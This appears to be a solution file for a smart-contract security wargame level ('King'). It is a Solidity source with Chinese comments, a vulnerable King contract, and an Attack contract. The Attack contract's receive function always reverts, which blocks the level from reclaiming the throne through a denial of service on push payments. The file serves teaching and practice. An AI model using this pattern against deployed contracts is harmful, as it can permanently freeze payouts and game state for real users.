// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.
 * 
 * 这么有趣的游戏, 你的目标是攻破他.
 * 
 * 当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.
 *
 * 思路：参考S09：拒绝服务漏洞
 * 提交实例给关卡时，关卡会重新申明王位，即关卡会转账给合约，触发receive，receive中会将我们的余额转回给我们
 * 因此只需要在receive或者fallback中阻止就可以了
 */
contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract Attack{
    event Log(bool _bool);
    receive() external payable {
        revert("DoS Attack!");
    }

    // 注意点：这里的转账需要使用call，因为transfer和send有2300gas的限制，要求King的receive中的逻辑不能太复杂，切记切记
    function attack(address payable gameAddr, uint256 amount) external payable {
        // gameAddr.transfer(amount);
        (bool success,) = gameAddr.call{value: amount}("");
        emit Log(success);
    }
}